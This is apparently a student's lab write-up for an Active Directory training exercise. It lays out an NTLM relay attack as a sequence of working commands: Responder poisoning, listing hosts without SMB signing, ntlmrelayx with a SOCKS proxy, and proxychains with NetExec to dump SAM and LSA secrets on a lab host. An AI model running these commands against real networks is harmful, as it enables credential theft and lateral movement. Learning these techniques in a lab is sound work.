Set up relay
`sudo responder -I eth0`

generate a list of hosts that do not have SMB Signing enabled
`nxc smb <ip-range> --gen-relay-list relay-list.txt

start NTLM relay with SOCKS proxy
`impacket-ntlmrelayx –tf relay-list.txt –smb2support –socks`

tunnel the traffic with proxychains through the SOCKS proxy
`proxychains nxc smb <ip> -u <relayed-user> -p WILL_BE_IGNORED`
- sometimes have to include `-d` for the domain


### Learning Objective 17

**Identify SMB Signing enforcement in car.corp**
`nxc smb 172.16.13.1-30 --smb-timeout 5 --gen-relay-list relay-list.txt`
![](assets/Pasted%20image%2020260724075600.png)

**Relay credentials of michael.johnson using SMB**
`impacket-ntlmrelayx -tf relaylist.txt -smb2support -socks`
![](assets/Pasted%20image%2020260724075633.png)

`sudo responder -I tun0`
- all servers ON
![](assets/Pasted%20image%2020260724075749.png)

once creds have been found, check ntlmrelayx for what it's doing
![](assets/Pasted%20image%2020260724080001.png)
- with the successful connections, they will be added to the SOCKS proxy


**Identify if michael.johnson has admin credentials on any machine**
type `socks` in ntlmrelayx console to check connections
![](assets/Pasted%20image%2020260724080406.png)
- also shows if you are admin on the connection



**Extract SAM and LSA on target machine with admin privileges**
`proxychains -q nxc smb 172.16.13.25 -u michael.johnson -p asdf`
- automatically uses session saved in SOCKS proxy since were using `proxychains`

`proxychains -q nxc smb 172.16.13.25 -u michael.johnson -p asdf -d CAR --sam --lsa`
![](assets/Pasted%20image%2020260724081916.png)

